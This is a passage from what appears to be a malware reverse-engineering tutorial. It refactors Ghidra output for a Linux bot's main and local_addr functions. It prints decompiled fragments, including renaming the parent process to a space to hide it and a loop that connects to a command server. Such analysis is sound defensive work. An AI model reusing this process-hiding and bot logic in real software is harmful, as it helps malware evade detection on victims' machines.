<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#40;</span><span class="kw4">long</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">else</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,*</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">**</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="co1">//After</span>
<span class="kw1">if</span> <span class="br0">&#40;</span>argv<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span> <span class="sy0">==</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">else</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,</span>argv<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<h3>Continuation of main</h3>
<p>The last part of the main function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">local_78 <span class="sy0">=</span> <span class="nu12">0x20</span><span class="sy0">;</span>
<span class="kw3">memset</span><span class="br0">&#40;</span>local_76<span class="sy0">,</span><span class="nu0">0</span><span class="sy0">,</span><span class="nu12">0x4e</span><span class="br0">&#41;</span><span class="sy0">;</span>
prctl<span class="br0">&#40;</span><span class="nu12">0xf</span><span class="sy0">,&amp;</span>local_78<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>local_78</em> is used as an argument in the <a href=" http://man7.org/linux/man-pages/man2/prctl.2.html">prctl</a> (PRocess ConTroL) function. This function alters a process based on the first argument, which is <em>0xf</em> (15 in decimal) in this case. The enum&#8217;s value can be found in <a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h">prctl.h</a> of the Linux source code. The value <em>0xf</em> is equal to <em>PR_SET_NAME</em>. This option requires only one additional parameter, which is also present in the decompiled code: a string. This string is the new name of the calling thread. </p>
<p>This effectively changes the parent process&#8217; name to <em>0x20</em>. The value <em>0x20</em> is, according to the <a href="http://www.asciitable.com/">ASCII table</a>, a space. This makes the parent process hard to spot in a process overview. The variable <em>local_78</em> can be renamed into <em>parentName</em>. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">parentName <span class="sy0">=</span> <span class="nu12">0x20</span><span class="sy0">;</span>
<span class="kw3">memset</span><span class="br0">&#40;</span>local_76<span class="sy0">,</span><span class="nu0">0</span><span class="sy0">,</span><span class="nu12">0x4e</span><span class="br0">&#41;</span><span class="sy0">;</span>
prctl<span class="br0">&#40;</span><span class="nu12">0xf</span><span class="sy0">,&amp;</span>parentName<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The call to <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memset-wmemset?view=vs-2019">memset</a> seems irrelevant here, as there are no cross references to <em>local_76</em> present. This might be a compiler optimisation, or it might be left by the malware&#8217;s author whilst working on changes.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">tVar3 <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
uVar2 <span class="sy0">=</span> getpid<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
srandom<span class="br0">&#40;</span>uVar2 <span class="sy0">^</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>tVar3<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  connection<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  recv_buf<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>tVar3</em> is equal to the return value of the <a href="https://en.cppreference.com/w/cpp/chrono/c/time">time</a> function. This function returns the amount of seconds that have passed since Epoch (the start of 1970). The <a href="http://man7.org/linux/man-pages/man2/getpid.2.html">getpid</a> function is used to obtain the current process&#8217; ID. The process ID is xored with the current time in seconds since epoch, after which the result is passed to the <a href="https://linux.die.net/man/3/srandom">srandom</a> function. The value serves as a seed for future calls towards <a href="https://www.tutorialspoint.com/c_standard_library/c_function_rand.htm">rand</a>, which returns a random value based on the seed.</p>
<p>As such, the variables <em>tVar3</em> and <em>uVar2</em> can be renamed into <em>currentTime</em> and <em>pidNumber</em> respectively. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">currentTime <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
pidNumber <span class="sy0">=</span> getpid<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
srandom<span class="br0">&#40;</span>pidNumber <span class="sy0">^</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>currentTime<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>At last, an endless loop is entered. Within this loop, two functions are called, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">do</span> <span class="br0">&#123;</span>
  connection<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  recv_buf<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<h3>A recap of main</h3>
<p>Before going into the functions that are called, a quick recap of the main function is given, along with the refactored code.</p>
<p>The <em>local_addr</em> function is called, which likely returns the local address, which is then used in the <em>ensure_bind</em> function. Two signals are then to be ignored, after which a fork of the program is created.</p>
<p>If the forking is successful, the <em>encryption_init</em> function is called. When an argument is given on the command line, that value is copied into the <em>myinfo</em> struct. If not, a default value is copied.</p>
<p>The name of the parent thread is then changed to a space, making it harder to see in a visual overview. The <em>memset</em> call can be ignored, as there are no cross references. The randomisation function is then seeded with the current time in Epoch format and the current process ID.</p>
<p>At last, the <em>connection</em> and <em>recv_buf</em> functions are called in an endless loop.</p>
<p>The complete refactored <em>main</em> function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> main<span class="br0">&#40;</span>undefined8 param_1<span class="sy0">,</span><span class="kw4">char</span> <span class="sy0">**</span>argv<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  __pid_t forkResult<span class="sy0">;</span>
  uint pidNumber<span class="sy0">;</span>
  time_t currentTime<span class="sy0">;</span>
  undefined2 parentName<span class="sy0">;</span>
  undefined local_76 <span class="br0">&#91;</span><span class="nu0">90</span><span class="br0">&#93;</span><span class="sy0">;</span>
  uint localAddr<span class="sy0">;</span>
&nbsp;
  localAddr <span class="sy0">=</span> local_addr<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  ensure_bind<span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>localAddr<span class="br0">&#41;</span><span class="sy0">;</span>
  signal<span class="br0">&#40;</span>SIGCHLD<span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span>SIG_IGN<span class="br0">&#41;</span><span class="sy0">;</span>
  signal<span class="br0">&#40;</span>SIGHUP<span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span>SIG_IGN<span class="br0">&#41;</span><span class="sy0">;</span>
  forkResult <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>forkResult <span class="sy0">&lt;</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    encryption_init<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>argv<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span> <span class="sy0">==</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">else</span> <span class="br0">&#123;</span>
      <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,</span>argv<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    parentName <span class="sy0">=</span> <span class="nu12">0x20</span><span class="sy0">;</span>
    <span class="kw3">memset</span><span class="br0">&#40;</span>local_76<span class="sy0">,</span><span class="nu0">0</span><span class="sy0">,</span><span class="nu12">0x4e</span><span class="br0">&#41;</span><span class="sy0">;</span>
    prctl<span class="br0">&#40;</span><span class="nu12">0xf</span><span class="sy0">,&amp;</span>parentName<span class="br0">&#41;</span><span class="sy0">;</span>
    currentTime <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    pidNumber <span class="sy0">=</span> getpid<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    srandom<span class="br0">&#40;</span>pidNumber <span class="sy0">^</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>currentTime<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">do</span> <span class="br0">&#123;</span>
      connection<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      recv_buf<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p><a name ="determining-the-next-steps"></a></p>
<h2><a href="#determining-the-next-steps">Determining the next steps</a></h2>
<p>At this point, one can set out multiple paths to fully analyse the malware. In this case, all unknown functions will be analysed in the order that they are encountered. This approach works the best to fully understand what the malware is doing.</p>
<p>If the goal is to analyse how a specific part of the malware works, searching for cross references to relevant functions and system calls will yield faster results.</p>
<p><a name ="obtaining-the-local-address"></a></p>
<h2><a href="#obtaining-the-local-address">Obtaining the local address</a></h2>
<p>The local address of a device is useful for malware authors as it is a unique identifier of the infected device. It can provide information about the geographical location of the victim. Additionally, it is useful to know what the address of a bot is, if the main purpose of the bot is to participate in DDoS attacks.</p>
<p>Before diving into the <em>local_addr</em> function, it is worth to note the <em>myinfo</em> struct&#8217;s third field is used in this method. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">ulong local_addr<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">int</span> __fd<span class="sy0">;</span>
  uint local_3c<span class="sy0">;</span>
  socklen_t local_2c<span class="sy0">;</span>
  sa_family_t local_28<span class="sy0">;</span>
  <span class="kw4">uint16_t</span> local_26<span class="sy0">;</span>
  <span class="kw4">uint32_t</span> local_24<span class="sy0">;</span>
  <span class="kw4">int</span> local_c<span class="sy0">;</span>
&nbsp;
  local_2c <span class="sy0">=</span> <span class="nu12">0x10</span><span class="sy0">;</span>
  __fd <span class="sy0">=</span> socket<span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>__fd <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    local_3c <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">else</span> <span class="br0">&#123;</span>
    local_28 <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    local_3c <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x8080808</span><span class="br0">&#41;</span><span class="sy0">;</span>
    htons<span class="br0">&#40;</span><span class="nu12">0x35</span><span class="br0">&#41;</span><span class="sy0">;</span>
    connect<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>local_28<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    getsockname<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>local_28<span class="sy0">,&amp;</span>local_2c<span class="br0">&#41;</span><span class="sy0">;</span>
    close<span class="br0">&#40;</span>__fd<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw3">sprintf</span><span class="br0">&#40;</span>myinfo.<span class="me1">unknown_2</span><span class="sy0">,</span><span class="st0">&quot;%d.%d.%d.%d&quot;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span>local_3c<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span><span class="br0">&#40;</span>local_3c <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>local_3c <span class="sy0">&gt;&gt;</span> <span class="nu12">0x10</span> <span class="sy0">&amp;</span> <span class="nu12">0xff</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>local_3c <span class="sy0">&gt;&gt;</span> <span class="nu12">0x18</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>local_3c<span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The <a href="http://man7.org/linux/man-pages/man2/socket.2.html">socket</a> function is used to create a socket. The function signature is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">int</span> socket <span class="br0">&#40;</span><span class="kw4">int</span> __domain<span class="sy0">,</span> <span class="kw4">int</span> __type<span class="sy0">,</span> <span class="kw4">int</span> __protocol<span class="br0">&#41;</span></pre></div></div></div></div></div></div></div>


<p>When looking into the x86_64 Linux source code for <a href="https://github.com/torvalds/linux/blob/master/include/linux/socket.h">socket.h</a>, one will see that the domain equals <em>AF_INET</em>. The type, as can be seen <a href="https://github.com/torvalds/linux/blob/master/include/linux/net.h">here</a>, equals <em>SOCK_DGRAM</em>. The protocol value 0, as defined in <em>/etc/protocols</em> on Linux systems, leaves the protocol type up to the system. Below is an excerpt from the <a href="https://linux.die.net/man/2/socket">manual page</a>:</p>
<pre>
The protocol specifies a particular protocol to be used with the socket. Normally 
only a single protocol exists to support a particular socket type within a given 
protocol family, in which case protocol can be specified as 0.
</pre>
<p>Using the equate functionality, one can change the values in Ghidra according to their original names. The change in code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
__fd <span class="sy0">=</span> socket<span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="co1">//After</span>
__fd <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span>SOCK_DGRAM<span class="sy0">,</span>DEFAULT_PROTOCOL<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The return value of the socket is <em>-1</em> when an error occurs. If there is no error, the file descriptor is returned. The variable <em>local_3c</em> is returned at the end of the function. As such, it can be refactored to <em>output</em>. The output is converted from host order into network order using <a href="https://beej.us/guide/bgnet/html/multi/htonsman.html">htonl</a>.</p>
<p>If there is no error, the <em>local_28</em> variable is set to <em>2</em>. Additionally, one can see the call to the <a href="https://beej.us/guide/bgnet/html/multi/htonsman.html">htons</a> function, which converts the value from host to network order. The hexadecimal value <em>0x35</em> equals <em>53</em> in decimal. One can display the decimal value in Ghidra by right clicking the value and selecting <em>Convert</em>, where <em>Unsigned Decimal</em> should be chosen.</p>
<p>The <a href="https://linux.die.net/man/2/getsockname">getsockname</a> function is used to get the address to which the given socket is bound. Alternatively, it can also be used to determine what the IP address of the callee is, as can be read <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-getsockname#remarks">here</a>. This condition is only met if the <a href="https://linux.die.net/man/3/connect">connect</a> function is called without a prior call to the <a href="https://linux.die.net/man/2/bind">bind</a> function. It expects several arguments, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">int</span> getsockname<span class="br0">&#40;</span><span class="kw4">int</span> sockfd<span class="sy0">,</span> <span class="kw4">struct</span> sockaddr <span class="sy0">*</span>addr<span class="sy0">,</span> socklen_t <span class="sy0">*</span> addrlen<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>In this case, the first argument is the socket that was created before. The second argument seems to point to a structure with the following lay-out:</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">struct</span> sockaddr <span class="br0">&#123;</span>
   <span class="kw4">unsigned</span> <span class="kw4">short</span>   sa_family<span class="sy0">;</span>
   <span class="kw4">char</span>             sa_data<span class="br0">&#91;</span><span class="nu0">14</span><span class="br0">&#93;</span><span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The value <em>2</em> (which is equal to <em>AF_INET</em>), is set as a family type. The second field, however, is never set, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">local_28 <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
output <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x8080808</span><span class="br0">&#41;</span><span class="sy0">;</span>
htons<span class="br0">&#40;</span><span class="nu12">0x35</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The <em>output</em> variable is made equal to <em>8.8.8.8</em>, which is Google&#8217;s DNS server address. The <a href="https://linux.die.net/man/3/htons">htons</a> function receives a single argument, which is equal to <em>53</em> in decimal. This is the port that is used for DNS requests.</p>
<p>The reason that the code looks odd here, is because the wrong type is being used. When looking at <a href="https://www.tutorialspoint.com/unix_sockets/socket_structures.htm">other socketaddr structs</a>, one will see the <em>sockaddr_in</em> structure, which is also given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">struct</span> sockaddr_in <span class="br0">&#123;</span>
   <span class="kw4">short</span> <span class="kw4">int</span>            sin_family<span class="sy0">;</span>
   <span class="kw4">unsigned</span> <span class="kw4">short</span> <span class="kw4">int</span>   sin_port<span class="sy0">;</span>
   <span class="kw4">struct</span> in_addr       sin_addr<span class="sy0">;</span>
   <span class="kw4">unsigned</span> <span class="kw4">char</span>        sin_zero<span class="br0">&#91;</span><span class="nu0">8</span><span class="br0">&#93;</span><span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>This structure has fields for the family, port, address and some padding. When changing the type of <em>local_28</em>, the decompiler automatically adjusts the code.  A comparison is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
local_28 <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
output <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x8080808</span><span class="br0">&#41;</span><span class="sy0">;</span>
htons<span class="br0">&#40;</span><span class="nu12">0x35</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="co1">//After</span>
local_28.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
local_28.<span class="me1">sin_addr</span> <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x8080808</span><span class="br0">&#41;</span><span class="sy0">;</span>
local_28.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu12">0x35</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Note that the socket input family (where the value equals two) also equals <em>AF_INET</em>. This can also be changed in the disassembler to reflect this in the code.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
local_28.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
&nbsp;
<span class="co1">//After</span>
local_28.<span class="me1">sin_family</span> <span class="sy0">=</span> AF_INET<span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Based on this information, the <em>local_28</em> variable can be renamed into <em>socket_input</em>. The <a href="https://linux.die.net/man/2/getsockname">getsockname</a> function requires the socket address input structure size as a third parameter. As such, the <em>local_2c</em> variable can be renamed to <em>socketSize</em>. The changes in the code are given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//[...]</span>
socket_input.<span class="me1">sin_family</span> <span class="sy0">=</span> AF_INET<span class="sy0">;</span>
socket_input.<span class="me1">sin_addr</span> <span class="sy0">=</span> htonl<span class="br0">&#40;</span><span class="nu12">0x8080808</span><span class="br0">&#41;</span><span class="sy0">;</span>
socket_input.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="nu12">0x35</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="co1">//[...]</span>
getsockname<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socket_input<span class="sy0">,&amp;</span>socketSize<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>After that, a connection is made to the IP address, the socket name is obtained and the socket handle is closed. As described above, a call to <a href="https://linux.die.net/man/3/connect">connect</a> without a call to the <a href="https://linux.die.net/man/2/bind">bind</a> function, will result in the local address of the device in the given <em>sockaddr_in</em> structure. The local address is then copied into the <em>unknown_2</em> field of the <em>myinfo</em> struct.</p>
<p>To edit the <em>myinfo</em> struct, one needs to search for the struct&#8217;s name in the Data Type Manager, right click on it, and select <em>Edit</em>. The name of the third field should be changed from <em>unknown_2</em> to <em>local_address</em>. Press the floppy icon to save the changes. The disassembly and decompiler views are then automatically updated to show the latest changes. Below, the difference in code is given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
<span class="kw3">sprintf</span><span class="br0">&#40;</span>myinfo.<span class="me1">unknown_2</span><span class="sy0">,</span><span class="st0">&quot;%d.%d.%d.%d&quot;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span>socket_input.<span class="me1">sin_addr</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>byte<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu12">0x10</span> <span class="sy0">&amp;</span> <span class="nu12">0xff</span><span class="br0">&#41;</span><span class="sy0">,</span>
            <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>socket_input.<span class="me1">sin_addr</span> <span class="sy0">&gt;&gt;</span> <span class="nu12">0x18</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="co1">//After</span>
